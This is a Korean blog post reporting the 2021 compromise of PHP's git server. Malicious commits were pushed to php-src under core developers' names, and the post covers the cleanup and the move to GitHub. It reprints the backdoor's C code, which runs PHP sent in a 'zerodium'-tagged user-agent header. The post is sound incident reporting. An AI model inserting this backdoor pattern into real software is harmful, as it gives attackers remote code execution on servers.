---
layout: post
id: 20
title: "PHP의 Git 서버가 해킹되었습니다."
subtitle: "PHP가 공급망 공격에 피해를 입었습니다."
description: "PHP의 깃 서버인 git.php.net이 공급망 공격을 당해 앞으론 github이 메인으로 사용되어집니다."
type: "PHP"
created_at: "2021-03-29"
updated_at: "2021-03-29"
blog: true
text: true
author: "silnex"
post-header: true
header-img: "img/hacked-php.png"
order: 20
tags: ["php", "hacking", "supply-chain-attack"]
comments: true
---

> PHP 인터널 공지: [https://news-web.php.net/php.internals/113838](https://news-web.php.net/php.internals/113838)

# TR; TL;

PHP의 git 서버가 공급망 해킹에 당해 앞으로 php-src는 Github를 메인으로 사용합니다.  
하지만 여러분에 서버에 설치된 PHP가 취약한 것은 아닙니다.  
다만, `php-src`를 직접 컴파일하여 사용하시는 분은 악성 커밋([1](https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d), [2](https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a))이 소스코드에 포함되어 있는지 확인이 필요합니다.

# 공급망 공격? (Supply chain attack)

공급망 공격이란 기존의 어플리케이션이나, 서비스를 공격했던 방식이 아닌 어플리케이션 혹은 서비스에서 사용중인 vendor에 악성 코드를 심는 방식으로,
최근 오픈소스로 관리되어지는 vendor혹은 패키지의 수가 많아지고, 누구나 수정할 수 있는 점을 이용한 공격 방식입니다.

# PHP-src에 삽입된 악성 코드

```c
zval *enc;

if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
	(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
	convert_to_string(enc);
	if (strstr(Z_STRVAL_P(enc), "zerodium")) {
		zend_try {
			zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
		} zend_end_try();
	}
}
```
이 코드는 HTTP 헤더에 zerodium이 있을 때 User agent에 삽입된 PHP코드를 실행 시키는 악성 코드입니다.

근데 이 악성커밋의 작성자가 PHP 주요 개발자인 `Nikita Popov`계정과 `Rasmus Lerdorf`계정으로 푸시되어 있어 [PHP internals](https://news-web.php.net/php.internals)에서 많은 이야기가 오고 갔습니다.

Nikita Popov는 최종적으로 자체 git 서버가 아닌 기존에 미러용으로 사용하던 Github의 Repo에서 관리하기로 했으며, 개발자들에게 `2FA`를 사용하라고 권고 했습니다.

# 복구 및 피해 규모

악성 커밋은 모두 Revert 되었으며, 현재 모든 Repo에 대해서 악성 커밋을 확인하고 있다고 합니다.

PHP 보안팀과 Nikita Popov가 확인한 결과 악성 커밋이 완료된 후 Fork나 Clone된 경우가 있긴 하지만, 실제 릴리즈에는 포함되지 않는단고 전했습니다.  
또한 Nikita Popov는 해당 브랜치는 PHP 8.1 개발용 브랜치로 연말에 출시될 예정이였다고 합니다.

이후 기존의 git 서버는 폐기되고 Github로 이동된다고 합니다.

# 마치면서

공급망 공격에 대한 경각심을 불러 일으킬만한 아주 좋은 예시가 이번에 생긴것같습니다. (PHP가 아니였음 했지만.. ㅜ)

더욱이 기존 프로젝트들이 외부 패키지나 라이브러리를 많이 의존하고 있었는데, 
이후 자체 제작을 지향하거나, 패키지 도입에 신중히 고민할 필요성이 예전보다 더욱더 생긴 것 같습니다.